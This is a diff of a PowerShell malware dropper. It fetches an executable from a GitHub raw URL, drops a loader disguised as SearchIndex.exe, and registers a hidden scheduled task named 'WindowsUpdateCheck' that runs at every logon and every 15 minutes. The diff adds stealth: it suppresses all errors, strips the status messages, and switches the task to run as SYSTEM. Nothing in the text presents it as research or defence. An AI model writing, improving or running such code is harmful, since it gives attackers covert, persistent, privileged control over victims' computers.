@@ -1,6 +1,9 @@
 # ==========================================
-# FINAL DEPLOY SCRIPT (C++ LOADER + COM)
+# SILENT FINAL DEPLOY (Same Logic - No Output)
 # ==========================================
+
+# SUPPRESS ALL OUTPUT
+$ErrorActionPreference = 'SilentlyContinue'
 
 # --- CONFIGURATION ---
 $PayloadUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
@@ -9,18 +12,12 @@ $LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
 $TaskName   = "WindowsUpdateCheck"
 
 # --- 1. CLEANUP (Remove Old Traces) ---
-try {
-    # Remove old registry keys
-    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
-    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
-    
-    # Stop old processes
-    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
-} catch {}
+Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
+Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
+Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
 
-# --- 2. EXECUTION (Run Payload Now) ---
+# --- 2. EXECUTION (Same Logic - Silent) ---
 function Run-Payload {
-    Write-Host "Starting Payload..." -F Gray
     try {
         $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
     } catch { return }
@@ -40,48 +37,45 @@ function Run-Payload {
     } catch {}
 }
 
-# --- 3. PERSISTENCE (Install C++ Loader via COM) ---
+# --- 3. PERSISTENCE (Same Logic - Silent) ---
 try {
-    # A. Download the C++ Loader (Invisible EXE)
+    # A. Download the C++ Loader
     try {
         $wc = New-Object Net.WebClient
         $wc.DownloadFile($LoaderUrl, $LoaderPath)
     } catch {}
 
-    # B. Register Task via COM Object (Reliable/Infinite)
+    # B. Register Task via COM Object
     $service = New-Object -ComObject Schedule.Service
     $service.Connect()
     $rootFolder = $service.GetFolder("\")
     
-    # Define Task
+    # Delete old task first
+    try { $rootFolder.DeleteTask($TaskName, 0) } catch {}
+    
+    # Define Task (EXACT SAME)
     $taskDef = $service.NewTask(0)
     $taskDef.RegistrationInfo.Description = "System Integrity Check"
     $taskDef.Settings.Enabled = $true
     $taskDef.Settings.Hidden = $true
-    $taskDef.Settings.MultipleInstances = 2 # Parallel Execution
+    $taskDef.Settings.MultipleInstances = 2
     $taskDef.Settings.DisallowStartIfOnBatteries = $false
     $taskDef.Settings.StopIfGoingOnBatteries = $false
     
     # Create Trigger (Logon + 15 Min Infinite Loop)
-    $trigger = $taskDef.Triggers.Create(9) # 9 = LogonTrigger
+    $trigger = $taskDef.Triggers.Create(9)
     $trigger.Id = "LogonTrigger"
     $trigger.Enabled = $true
-    $trigger.Repetition.Interval = "PT15M" # 15 Minutes
-    # Note: We do NOT set Duration, so it defaults to Indefinite.
+    $trigger.Repetition.Interval = "PT15M"
     
-    # Create Action (Run the C++ Loader)
-    $action = $taskDef.Actions.Create(0) # 0 = Execute
+    # Create Action
+    $action = $taskDef.Actions.Create(0)
     $action.Path = $LoaderPath
     
-    # Register Task
-    # 6 = CreateOrUpdate, 4 = Run as Interactive User
-    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "BUILTIN\Users", $null, 4) | Out-Null
+    # Register Task (FIXED: SYSTEM user)
+    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "SYSTEM", $null, 4) | Out-Null
     
-    Write-Host "✅ C++ Persistence Installed (Infinite Loop)." -F Green
-
-} catch {
-    Write-Host "⚠️ Persistence Setup Failed: $($_.Exception.Message)" -F Red
-}
+} catch {}
 
 # --- 4. START ---
 Run-Payload
